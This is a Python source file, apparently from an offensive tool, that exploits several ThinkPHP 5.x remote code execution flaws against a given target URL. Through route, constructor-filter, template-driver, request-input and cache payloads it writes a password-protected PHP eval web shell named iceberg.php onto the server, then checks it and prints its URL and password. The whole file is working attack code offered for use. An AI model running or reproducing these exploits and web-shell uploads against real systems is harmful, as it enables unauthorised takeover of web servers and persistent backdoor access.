# -*- coding: utf-8 -*-

import requests

headers = {
        'Content-Type': "application/x-www-form-urlencoded",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
    }

class Shell:

    def __init__(self, target, check):
        headers = {
            'Content-Type': "application/x-www-form-urlencoded",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
        }
        self.target = target
        self.check = check
        self.headers = headers
        self.webshell = "<?php @eval($_POST['iceberg']);?>"

    def check_shell(self):
        for method in list(self.check.keys()):
            if method == "tp5_construct_rce_get":
                self.method = "tp5_construct_rce"
                if self.check_5_x_construct_rce_shell() == False:
                    continue
                else:
                    break

            elif method == "tp5_construct_other":
                self.method = "tp5_construct_other"
                if self.check_5_x_construct_other_shell() == False:
                    continue
                else:
                    break
            elif method == "tp5_route_rce_get":
                self.method = "tp5_route_rce_get"
                if self.check_5_x_route_rce_get_shell() == False:
                    continue
                else:
                    break
            elif method == "tp5_template_driver_rce":
                self.method = "tp5_template_driver_rce"
                if self.check_5_x_template_driver_rce_shell() == False:
                    continue
                else:
                    break
            elif method == "tp5_showid_rce":
                self.method = "tp5_showid_rce"
                if self.check_5_x_showid_rce_shell() == False:
                    continue
                else:
                    break
            elif method == "tp5_request_input_rce":
                self.method = "tp5_request_input_rce"
                if self.check_5_x_request_input_rce_shell() == False:
                    continue
                else:
                    break
            elif method == "tp5_lite_code_rce":
                self.method = "tp5_lite_code_rce"
                if self.check_5_x_lite_code_rce_shell() == False:
                    continue
                else:
                    break
            elif method == "tp5_cache_rce":
                self.method = "tp5_cache_rce"
                if self.check_5_x_cache_rce_shell() == False:
                    continue
                else:
                    break
            else:
                print("[-] {0} 无法写入webshell!")

    def check_5_x_construct_rce_shell(self):
        try:

            poc = self.check[self.method]
            if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
                shell_code = "_method=__construct&filter[]=system&method=GET&get[]=echo '{0}'>iceberg.php".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code , headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    shell_code = "_method=__construct&filter[]=assert&method=GET&get[]=file_put_contents('iceberg.php','{0}')".format(self.webshell)
                    payload = self.target + "/index.php?s=index"
                    requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                    res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                    if res_shell.status_code == 200:
                        print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                    else:
                        print("[-]上传失败!")
                        return False

            elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
                shell_code = "s=echo '{0}'>iceberg.php&_method=__construct&method=POST&filter[]=system".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    shell_code = "s=file_put_contents('iceberg.php','{0}')&_method=__construct&method=POST&filter[]=assert".format(self.webshell)
                    payload = self.target + "/index.php?s=index"
                    requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                    res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                    if res_shell.status_code == 200:
                        print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                    else:
                        print("[-]上传失败!")
                        return False
            elif "aaaa=1&_method=__construct&method=GET&filter[]=phpinfo" == poc:
                shell_code = "aaaa=echo '{0}'>iceberg.php&_method=__construct&method=GET&filter[]=system".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    shell_code = "aaaa=file_put_contents('iceberg.php','{0}')&_method=__construct&method=GET&filter[]=assert".format(self.webshell)
                    payload = self.target + "/index.php?s=index"
                    requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                    res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                    if res_shell.status_code == 200:
                        print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                    else:
                        print("[-]上传失败!")
                        return False

            elif "c=phpinfo&f=1&_method=filter" == poc:
                shell_code = "c=system&f=echo '{0}'>iceberg.php&_method=filter".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    shell_code = "c=assert&f=file_put_contents('iceberg.php','{0}')&_method=filter".format(self.webshell)
                    payload = self.target + "/index.php?s=index"
                    requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                    res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                    if res_shell.status_code == 200:
                        print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                    else:
                        print("[-]上传失败!")
                        return False
            else:
                pass
        except Exception as e:
            print("请求超时!")

    def check_5_x_construct_other_shell(self):
        try:
            poc = self.check[self.method]
            if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
                shell_code = "_method=__construct&filter[]=assert&method=GET&get[]=file_put_contents('iceberg.php','{0}')".format(self.webshell)
                payload = self.target + "/index.php?s=captcha"
                requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")
                    return False
            elif "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1" == poc:
                shell_code = "_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=file_put_contents('iceberg.php','{0}')".format(self.webshell)
                payload = self.target + "/index.php?s=captcha"
                requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")
                    return False
            elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
                shell_code = "s=file_put_contents('iceberg.php','{0}')&_method=__construct&method=POST&filter[]=assert".format(self.webshell)
                payload = self.target + "/index.php?s=captcha"
                requests.post(payload, data=shell_code, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")
                    return False
            else:
                pass
        except Exception as e:
            print("请求超时!")

    def check_5_x_route_rce_get_shell(self):
        try:
            poc = self.check[self.method]
            if "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
                shell_code = "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=iceberg.php&vars[1][]={0}".format(self.webshell)
                payload = self.target + "/index.php" + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")
                    return False
        except Exception as e:
            print("请求超时!")

    def check_5_x_template_driver_rce_shell(self):
        try:
            poc = self.check[self.method]
            if "?s=index/\\think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>" == poc:
                shell_code = "?s=index/\\think\\template\\driver\\file/write&cacheFile=iceberg.php&content={0}".format(self.webshell)
                payload = self.target + "/index.php" + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-] 上传失败!")
                    return False
            elif "?s=index/think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>" == poc:
                shell_code = "?s=index/think\\template\\driver\\file/write&cacheFile=iceberg.php&content={0}".format(self.webshell)
                payload = self.target + "/index.php" + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-] 上传失败!")
                    return False
            else:
                pass
        except Exception as e:
            print("请求超时!")

    def check_5_x_showid_rce_shell(self):
        try:
            poc = self.check[self.method]
            if "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~phpinfo()}]" == poc:
                shell_code = "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~system(echo '{0}')}]".format(self.webshell)
                payload = self.target + "/index.php" + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-] 上传失败!")
                    return False
        except Exception as e:
            print("请求超时!")

    def check_5_x_request_input_rce_shell(self):
        try:
            poc = self.check[self.method]
            if "?s=index/\\think\\Request/input&filter=phpinfo&data=1" == poc:
                shell_code = "?s=index/\\think\\Request/input&filter=system&data=echo '{0}'>iceberg.php".format(self.webshell)
                payload = self.target + "/index.php" + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-] 上传失败!")
                    return False
            elif "?s=index/think\\Request/input&filter=phpinfo&data=1" == poc:
                shell_code = "?s=index/think\\Request/input&filter=system&data=echo '{0}'>iceberg.php".format(self.webshell)
                payload = self.target + "/index.php" + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-] 上传失败!")
                    return False
            else:
                pass
        except Exception as e:
            print("请求超时!")

    def check_5_x_lite_code_rce_shell(self):
        try:
            poc = self.check[self.method]
            if "/index.php/module/action/param1/${@print(var_dump(iceberg))}" == poc:
                shell_code = "/index.php?s=/sd/iex/xxx/${@eval($_GET['x'])}&x=file_put_contents('iceberg.php','{0}');".format(self.webshell)
                payload = self.target + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-] 上传失败!")
                    return False
        except Exception as e:
            print("请求超时!")

    def check_5_x_cache_rce_shell(self):
        try:
            poc = self.check[self.method]
            if "%0d%0avar_dump('iceberg-N');%0d%0a//" == poc:
                shell_code = "%0d%0asystem(echo '{0}'>iceberg.php);%0d%0a//".format(self.webshell)
                payload = self.target + shell_code
                requests.get(payload, headers=self.headers, timeout=10, verify=False)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers, timeout=10, verify=False)
                if res_shell.status_code == 200:
                    print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-] 上传失败!")
                    return False
        except Exception as e:
            print("请求超时!")